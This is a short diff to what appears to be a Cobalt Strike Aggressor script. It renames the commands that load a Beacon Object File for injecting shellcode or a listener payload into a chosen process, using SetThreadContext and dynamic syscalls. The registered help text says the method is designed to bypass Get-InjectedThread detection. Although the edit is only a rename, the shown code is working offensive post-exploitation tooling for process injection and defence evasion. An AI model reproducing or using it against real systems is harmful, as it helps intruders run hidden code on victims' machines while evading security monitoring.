@@ -4,7 +4,7 @@
 # $2 = pid
 # x86_64-w64-mingw32-gcc -c dynamicsyscall_stcinject.c -o dynamicsyscall_stcinject.o
 
-alias dynsyscall_stc_shinject {
+alias dsyscall_stc_shinject {
 	local('$handle $data $args $sc_data $filename $extension');
 	
 	# read in the right BOF file
@@ -45,7 +45,7 @@ alias dynsyscall_stc_shinject {
 
 }
 
-alias dynsyscall_stc_inject {
+alias dsyscall_stc_inject {
 	local('$bid $handle $data $pid $listener $payload');
 
 	# check our arguments
@@ -92,7 +92,7 @@ alias dynsyscall_stc_inject {
 		beacon_inline_execute($1, $data, "go", $args);
 	}
 }
-beacon_command_register("dynsyscall_stc_inject", "XPN's SetThreadContext injection method with Dynamic syscalls.", "Synopsis: dynsyscall_stc_inject [pid] [listener] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method.");
+beacon_command_register("dsyscall_stc_inject", "XPN's SetThreadContext injection method with Dynamic syscalls.", "Synopsis: dsyscall_stc_inject [pid] [listener] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method.");
 
-beacon_command_register("dynsyscall_stc_shinject", "Dynamic syscalls to execute custom shellcode (.bin) from disk.", "Synopsis: dynsyscall_stc_shinject [pid] [path/to/payload.bin] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method using custom shellcode from disk.\nOption: From dll to .bin with SRDI.");
+beacon_command_register("dsyscall_stc_shinject", "Dynamic syscalls to execute custom shellcode (.bin) from disk.", "Synopsis: dsyscall_stc_shinject [pid] [path/to/payload.bin] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method using custom shellcode from disk.\nOption: From dll to .bin with SRDI.");
 
